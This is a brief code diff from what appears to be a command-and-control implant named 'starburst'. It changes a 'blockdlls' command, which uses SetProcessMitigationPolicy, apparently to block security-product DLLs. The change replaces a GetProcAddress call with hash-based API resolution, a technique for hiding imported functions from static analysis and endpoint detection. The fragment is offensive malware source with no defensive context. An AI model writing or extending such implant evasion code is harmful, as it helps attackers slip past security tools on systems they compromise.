@@ -28,8 +28,8 @@ auto declfn starburst::cmd_blockdlls(
     auto k32 = inst.kernel32.handle;
 
     auto pSetProcessMitigationPolicy = reinterpret_cast<fn_SetProcessMitigationPolicy>(
-        inst.kernel32.GetProcAddress( (HMODULE)k32,
-            symbol<LPCSTR>( "SetProcessMitigationPolicy" ) ) );
+        resolve::_api( reinterpret_cast<uintptr_t>( (HMODULE)k32 ),
+            expr::hash_string( "SetProcessMitigationPolicy" ) ) );
 
     if ( !pSetProcessMitigationPolicy ) {
         queue_response( inst, task_uuid, RESPONSE_ERROR,
